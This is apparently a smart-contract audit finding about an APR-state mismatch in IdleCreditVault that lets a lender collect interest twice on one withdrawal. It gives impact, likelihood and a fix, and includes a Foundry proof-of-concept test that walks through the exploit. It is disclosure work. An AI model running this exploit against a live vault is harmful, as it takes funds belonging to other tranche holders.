### Title
Inconsistent APR state double-pays interest on withdrawal receipts - (File: contracts/strategies/idle/IdleCreditVault.sol)

### Summary
`IdleCreditVault` maintains two APR representations: `lastApr`, used by the CDO to calculate withdrawal interest, and `unscaledApr`, used by the vault to decide whether a receipt belongs to the APR0 flow. `setApr` updates `lastApr` without updating `unscaledApr`, so an honest manager call can leave the vault with `lastApr > 0` and `unscaledApr == 0`. [1](#0-0) 

### Finding Description
A withdrawal requested while `lastApr` is positive is priced as `principal + interest - fees` in `IdleCDOEpochVariant.requestWithdraw`. [2](#0-1) 

However, `IdleCreditVault.requestWithdraw` classifies the same receipt as APR0 solely because `unscaledApr == 0`, recording the already interest-inclusive `_amount` as APR0 principal instead of recording it in `withdrawsRequests`. [3](#0-2) 

At the next `stopEpoch`, `prepareStopEpochWithApr0` treats that inflated principal as APR0 principal and allocates it another pro-rata share of realized epoch interest through `apr0RateByEpoch`. [4](#0-3) 

When the attacker claims, `_settleApr0` adds that second interest allocation to `settledInterest`, while the funded claim pays both the original receipt amount and the newly accrued APR0 interest. [5](#0-4) 

### Impact Explanation
An unprivileged KYC-passing lender can receive interest twice on the same withdrawal: once inside the original `_amount` minted as the receipt, and again through `apr0RateByEpoch`. [6](#0-5) 

The extra amount is added directly to `pendingWithdraws`, so the borrower/CDO must fund it at `stopEpoch`; if funded, the attacker drains value belonging to active tranche holders, and if not funded, the withdrawal queue can become undercollateralized. [7](#0-6) 

For example, with a 365-day epoch, zero buffer, and a 10% APR, an attacker withdrawing a 10,000-unit position first receives an approximately 11,000-unit receipt; if 90,000 units remain active and earn 9,000 units, the APR0 path assigns the attacker roughly another 980 units pro rata, for a total payout near 11,980 units.

### Likelihood Explanation
The required state is reachable through an explicitly supported manager operation: `setApr` may be called directly by the manager, but it changes only `lastApr` and does not synchronize `unscaledApr`. [8](#0-7) 

The attacker only needs to place a normal withdrawal after that APR update and before the next epoch settles; no privileged action, malicious borrower, external oracle manipulation, receipt transfer, or default is required.

### Recommendation
Make `setApr` update `unscaledApr` whenever it is called outside the CDO's scaled-APR path, or remove direct manager access and require all APR changes to pass through `setAprs`/`setAprsWithBuffer`. [9](#0-8) 

Additionally, classify APR0 withdrawals using the same authoritative APR value used for withdrawal interest, and add an invariant asserting that `unscaledApr == 0` whenever `lastApr == 0` and vice versa.

### Proof of Concept
```solidity
// In a Foundry credit-vault fork test.

// 1. Configure the pool at APR=0, then let the honest manager use the
//    documented direct setApr path.
IdleCreditVault strategy = IdleCreditVault(address(cdo.strategy()));
vm.prank(manager);
strategy.setApr(10e18);

assertEq(strategy.unscaledApr(), 0);
assertEq(strategy.lastApr(), 10e18);

// 2. Keep another active depositor in the vault, then attacker requests
//    a withdrawal during the buffer.
uint256 attackerPrincipal = 10_000e6;
uint256 activePrincipal = 90_000e6;

uint256 attackerTranches = depositAAFor(attacker, attackerPrincipal);
depositAAFor(victim, activePrincipal);

uint256 requestTime = block.timestamp;
vm.prank(attacker);
uint256 receiptAmount = cdo.requestWithdraw(attackerTranches, address(AA));

// requestWithdraw priced the receipt using lastApr, so this already
// contains approximately one epoch of interest.
uint256 embeddedInterest =
    attackerPrincipal * 10_000 * cdo.epochDuration() /
    (365 days * 100_000);
assertGe(receiptAmount, attackerPrincipal + embeddedInterest - 1);

// The strategy nevertheless classified the receipt as APR0 principal.
(,, uint256 principal,,) = strategy.apr0Users(attacker);
assertEq(principal, receiptAmount);
assertEq(strategy.withdrawsRequests(attacker), 0);

// 3. Run one epoch and fund it normally.
vm.prank(manager);
cdo.startEpoch();
vm.warp(cdo.epochEndDate() + 1);
fundBorrowerForStopEpoch();
vm.prank(manager);
cdo.stopEpoch(0, 0);

// 4. The attacker receives both the embedded receipt interest and a second
//    pro-rata APR0 interest allocation.
uint256 before = underlying.balanceOf(attacker);
vm.prank(attacker);
cdo.claimWithdrawRequest();
uint256 paid = underlying.balanceOf(attacker) - before;

assertGt(paid, receiptAmount);
```

The decisive assertion is `paid > receiptAmount`: the funded claim pays the original receipt and then adds `settledInterest` generated from the same receipt's inflated APR0 principal. [10](#0-9)

### Citations

**File:** contracts/strategies/idle/IdleCreditVault.sol (L206-235)
```text
  function setAprs(uint256 _unscaledApr, uint256 _apr) external {
    unscaledApr = _unscaledApr;
    // here we also check that msg.sender is allowed
    setApr(_apr);
  }

  /// @notice set both the unscaled APR and APR scaled by epoch plus buffer duration.
  /// @dev only CDO and manager can set the APR through `setApr`.
  /// @param _unscaledApr unscaled APR
  /// @param _duration epoch duration
  /// @param _buffer buffer duration
  function setAprsWithBuffer(uint256 _unscaledApr, uint256 _duration, uint256 _buffer) external {
    unscaledApr = _unscaledApr;
    setApr(_duration == 0 ? _unscaledApr : _unscaledApr * (_duration + _buffer) / _duration);
  }

  /// @notice set the fixed apr
  /// @dev only cdo and manager can set the apr. If manager manually set apr from 
  /// here it will not be scaled to include the buffer period
  function setApr(uint256 _apr) public {
    address _cdo = idleCDO;

    // if cdo is not yet set we skip the check (this can happen only during the setup)
    if (_cdo != address(0)) {
      if (msg.sender != _cdo && msg.sender != manager) revert NotAllowed();
    }
    uint256 _maxApr = maxApr;
    if (_maxApr != 0 && _apr > _maxApr) revert NotAllowed();
    lastApr = _apr;
  }
```

**File:** contracts/strategies/idle/IdleCreditVault.sol (L272-293)
```text
    // burn strategy tokens from cdo (we don't burn future interest here, only the principal)
    _burn(msg.sender, _principal);
    // mint equal amount of strategy tokens to the user as receipt (interest included), useful in case of default
    _mint(_user, _amount);
    // A successfully closed pool already recalled all funds and has no later stopEpoch.
    if (!isClosed) {
      // Global amount that stopEpoch must source from borrower/strategy for all pending receipts.
      pendingWithdraws += _amount;
    }
    // save the epoch of the last withdraw request (buffer + epochDuration is 1 epoch)
    lastWithdrawRequest[_user] = currentEpoch;
    // APR=0 requests keep separate accounting and settle interest at stopEpoch.
    // `_amount` here is the post-management-fee principal bucket for that flow.
    if (unscaledApr == 0 && !isClosed) {
      _requestWithdrawApr0(_amount, _user);
    } else {
      // increase the withdraw requests for the user
      // we record both per-user (old, kept for compatibility) and per-epoch so
      // on finalization we can distinguish "default-epoch pending receipts"
      // from old funded receipts.
      withdrawsRequests[_user] += _amount;
      withdrawsRequestsByEpoch[_user][currentEpoch] += _amount;
```

**File:** contracts/strategies/idle/IdleCreditVault.sol (L330-349)
```text
    _settleApr0(_user);
    Apr0UserData storage _apr0User = apr0Users[_user];
    // Claim includes:
    // - settled APR0 principal from finalized epochs
    // - still-open APR0 principal: if pool-close mode was used (_interest == 1), IdleCDO sets
    //   epochEndDate = 0 and claims can be immediate, while _settleApr0 can still skip settlement
    //   for the current request epoch (reqEpoch >= epochNumber).
    // - settled APR0 interest
    uint256 normalAmount = withdrawsRequests[_user];
    uint256 apr0PrincipalAmount = _apr0User.settledPrincipal + _apr0User.principal;
    uint256 apr0InterestAmount = _apr0User.settledInterest;
    amount = normalAmount + apr0PrincipalAmount + apr0InterestAmount;
    // burn strategy tokens 1:1 with the principal only (normal amount already includes interest)
    _burn(_user, normalAmount + apr0PrincipalAmount);
    withdrawsRequests[_user] = 0;
    lastWithdrawRequest[_user] = 0;
    if (apr0PrincipalAmount != 0 || apr0InterestAmount != 0) {
      delete apr0Users[_user];
    }
    _transferFundedClaim(_user, amount);
```

**File:** contracts/strategies/idle/IdleCreditVault.sol (L513-562)
```text
    if (_expInterest > 1 && _expInterest > _pendingFees) {
      // Remove already booked withdraw fees from the interest base before splitting.
      uint256 _interestNetOfFees = _expInterest - _pendingFees;
      // Total principal used for the pro-rata split:
      // IdleCDO TVL (which excludes APR0 requested principal) + APR0 principal bucket.
      uint256 _totalPrincipalForSplit = _tvl + _principal;
      if (_totalPrincipalForSplit != 0) {
        // APR0 users get a pro-rata share of realized interest.
        uint256 _apr0InterestGross = _interestNetOfFees * _principal / _totalPrincipalForSplit;
        if (_apr0InterestGross != 0) {
          // Same fee model as normal withdraw interest.
          uint256 _apr0Fee = _apr0InterestGross * _cdo.fee() / FULL_ALLOC;
          _apr0NetInterest = _apr0InterestGross - _apr0Fee;
          _adjPendingWithdrawFees += _apr0Fee;
          _expInterest -= _apr0NetInterest;
        }
      }
    }

    // Finalize one-epoch APR0 interest for current epoch only.
    if (_apr0NetInterest != 0) {
      // Funds owed to withdraw requesters increase by APR0 net interest.
      pendingWithdraws += _apr0NetInterest;
      // Save per-epoch net rate; each APR0 request accrues exactly once on its request epoch.
      apr0RateByEpoch[epochNumber] = (_apr0NetInterest * 1e18) / _principal;
    }
    // Close current APR0 bucket so it cannot accrue again on later stopEpoch calls.
    apr0TotalPrincipal = 0;
  }

  /// @notice settle APR=0 requests for a user once their epoch is finalized
  /// @param _user address of the user
  function _settleApr0(address _user) internal {
    Apr0UserData storage _apr0User = apr0Users[_user];
    uint256 _principal = _apr0User.principal;
    if (_principal == 0) {
      return;
    }
    uint256 _reqEpoch = _apr0User.principalEpoch;
    // Settle only after stopEpoch bumped epochNumber (ie after one full wait epoch).
    if (_reqEpoch >= epochNumber) {
      return;
    }
    // Move principal from "open APR0 bucket" to "settled bucket" (same principal, not duplicated).
    _apr0User.settledPrincipal += _principal;
    uint256 _rate = apr0RateByEpoch[_reqEpoch];
    if (_rate != 0) {
      // Convert per-epoch rate to claimable underlying interest.
      _apr0User.settledInterest += (_principal * _rate) / 1e18;
    }
```

**File:** contracts/IdleCDOEpochVariant.sol (L772-788)
```text
    uint256 principal = _underlyings;
    (uint256 interest, int256 diff) = _calcInterestWithdrawRequest(_underlyings, _tranche);
    uint256 totalFees = _totalWithdrawFees(principal, interest);
    // user is requesting principal + interest minus upfront management fee and net performance fee
    _underlyings = principal + interest - totalFees;
    // add expected fees to pending withdraw fees counter
    pendingWithdrawFees += totalFees;

    /// if there is an AA withdrawal the overperformance that the amount withdrawed would have generated for BB tranches
    /// is saved in interestForOverUnderPerformance. This is used to calculate the interest that should be added to the
    /// expectedEpochInterest at the startEpoch.
    /// If there is a BB withdrawal this amount is subtracted from the expectedEpochInterest
    interestForOverUnderPerformance += diff;

    // The receipt is fixed now and leaves live NAV. Charge management fees upfront
    // for the time it waits outside live NAV: remaining buffer plus the next epoch.
    creditVault.requestWithdraw(_underlyings, msg.sender, principal);
```
